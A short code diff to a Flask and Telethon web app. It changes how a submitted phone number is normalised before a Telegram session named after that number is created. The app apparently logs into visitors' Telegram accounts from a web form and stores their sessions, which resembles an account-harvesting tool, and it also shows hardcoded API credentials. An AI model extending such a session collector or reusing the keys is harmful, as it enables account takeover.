@@ -4,6 +4,7 @@ from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
 import os
 import asyncio
 import threading
+import re
 
 API_ID = 26006502
 API_HASH = "9afc2208b8cec0afe06c9c2bc15b53e4"
@@ -20,6 +21,7 @@ loop = asyncio.new_event_loop()
 
 # Запуск бота в этом loop
 bot = TelegramClient('bot_session', API_ID, API_HASH, loop=loop)
+
 
 sent_files = set()
 clients = {}
@@ -66,9 +68,17 @@ async def create_and_connect_client(session_name, phone):
 @app.route("/", methods=["GET", "POST"])
 def index():
     if request.method == "POST":
-        phone = request.form["phone"].strip()
-        if not phone.startswith(('+7', '+380', '+375', '+370')) and not phone.startswith('+3'):
-            return render_template("index.html", stage="phone", error="Разрешены только номера из Европы и СНГ.")
+        phone_raw = request.form["phone"]
+
+        # Убираем все символы кроме цифр
+        digits = re.sub(r'\D', '', phone_raw)
+
+        # Если номер начинается с 8 и длина 11 -> меняем на 7 (российский формат)
+        if digits.startswith('8') and len(digits) == 11:
+            digits = '7' + digits[1:]
+
+        # Добавляем плюс в начале
+        phone = '+' + digits
 
         session_name = f"sessions/{phone}"
 
